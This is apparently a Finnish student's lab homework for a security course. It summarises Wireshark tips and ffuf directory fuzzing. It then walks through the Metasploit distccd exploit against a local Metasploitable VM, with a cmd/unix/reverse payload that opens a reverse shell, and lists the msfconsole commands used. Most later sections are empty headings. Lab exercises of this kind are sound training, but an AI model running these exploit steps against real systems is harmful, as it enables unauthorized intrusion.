# h3 Nuuskija

## x) Lue ja tiivistä

Popov 2024: Hacktricks: Wireshark tricks [https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills)

- Analyysityökaluja: Expert Information näyttää analyysin pääkohdat; Protocol Hierarchy listaa kaikki protokollat
- Suodattimet: esim. http.request, näyttää HTTP-liikenteen
- CTRL+F hakee sisältöä

Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)
- FFUF (Fuzz Faster U Fool): nopea web-fuzzer, tunnistaa piilotettuja URL-osoitteita testaamalla automaattisesti useita URL-osoitteita -> vähemmän manuaalista työtä, enemmän tuloksia
-  FUFF käyttää sanakirjatiedostoja etsiäkseen piilotettuja URL-osoitteita tai hakemistoja
- Ohjeesta löytyy testattava kohde sekä suositus sanakirjatiedostolähteestä
- web-palvelin palauttaa HTTP-statuskoodin 200 OK kaikille URL-osoitteille, yhteisiä piirteitä ei-toivotuista vasteista voi etsiä ja suodattaa tuloksia niiden perusteella
- Suodattimia: vasteen koko (-fs), sanamäärä (-fw), rivit (-fl)
- Esim. curlilla voi tarkastaa tulokset

## a) Valitse valmis hyökkäys. Ota sellainen hyökkäys, jonka saat toimimaan omaan paikalliseen harjoitusmaaliin, kuten Metasploitableen. Demonstroi hyökkäyksen toiminta.

Googlasin hyökkäyksiä, ja löysin yhden, joka vaikutti helposti toteutettavalta sivulta [https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e](https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e): DISTCCD Open Port.

Avasin msfconsolen ``sudo msfconsole``, etsin hyökkäyksen ``search distccd`` ja valitsin hyökkäyksen ``use 0``. Asetin kohteeksi Metasploitablen ``set RHOSTS 192.168.56.102``.

![image](https://github.com/user-attachments/assets/c3426118-6cd5-48c9-9c7d-9bc6d98f5306)

``show payloads`` katsoin, millaisia payloadeja hyökkäyksessä pystyi käyttämään. Löytämäni ohjeen mukaan valitsin cmd/unix/reverse ``set PAYLOAD 6``, ja sitten ``run``.

Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show options`` pitäisikö jotain muuta määrittää. Korjasin LHOST ``set LHOST 192.168.56.101``, valitsin saman payloadin ja suoritin exploitin uudelleen. Nyt pääsin sisään, mutten rootina. Päivittämällä session Meterpreter-sessioksi pystyi kuitenkin etenemään, mutta ilman sudo-oikeuksia kaikkialle ei päässyt.

![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)





## b) Sorsa. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa lähdekoodista.


## c) Snif snif. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa verkkosnifferillä. Pohdi myös, miten näkyvä tämä hyökkäys tai kontrollikanava on verkossa. (Vapaaehtoinen bonus: liitä mukaan pcap tekemästäsi nauhoituksesta).


## d) Fuzzzz. Ratkaise dirfuz-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.


## d) HTB. Ratkaise 1-2 konetta HackTheBoxisssa. Voit valita omaan taitotasoon sopivat koneet.


## e) Vapaaehtoinen, helppo: Vaihda 'micro' Metasploitin oletuseditoriksi. Sille on oma 'setg' asetus.


## Lähteet


https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
